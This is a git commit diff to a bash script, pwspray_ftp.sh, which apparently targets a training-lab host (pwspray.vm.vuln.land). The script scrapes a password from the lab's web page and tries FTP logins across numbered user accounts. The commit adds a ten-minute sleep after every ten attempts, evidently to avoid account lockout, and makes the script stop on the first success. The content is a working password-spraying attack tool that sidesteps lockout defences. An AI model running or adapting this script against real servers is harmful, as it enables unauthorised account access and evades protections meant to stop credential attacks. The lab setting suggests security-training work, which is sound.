aead17ffb3cee4740c47e571fd50e1a7d1ade381
JRM RZN <38128422+jrmrzn@users.noreply.github.com>
2025-10-19 14:55:20 +0200

    improved pwspray_ftp.sh

--- pwspray_ftp.sh
+++ pwspray_ftp.sh
@@ -2,16 +2,23 @@
 
 MYSTART=$1
 MYEND=$2
-
+MYCOUNTER=0
 MYPASS=$(curl -k --resolve pwspray.vm.vuln.land:21:152.96.14.197 https://pwspray.vm.vuln.land | grep ftp -A 3 | tail -1 | cut -d'>' -f 2 | cut -d'<' -f 1)
 echo "Password is set to: ${MYPASS}"
 
 
 for i in $( seq ${MYSTART} ${MYEND}); do
 
+  (($MYCOUNTER++))
+  if [[ $MYCOUNTER -eq 10 ]]; then
+    date
+    echo "sleeping for 10 minutes"
+    sleep 605
+    MYCOUNTER=0
+  fi
 
   curl --resolve pwspray.vm.vuln.land:21:152.96.14.197 --ftp-pasv ftp://user_${i}:${MYPASS}@pwspray.vm.vuln.land
-  if [ $? -eq 0 ]; then echo "------ Found it: user_${i}  ---------"; break; else echo "user_${i} did not work";fi
+  if [ $? -eq 0 ]; then echo "------ Found it: user_${i}  ---------"; exit 0; else echo "user_${i} did not work";fi
 
 
 done
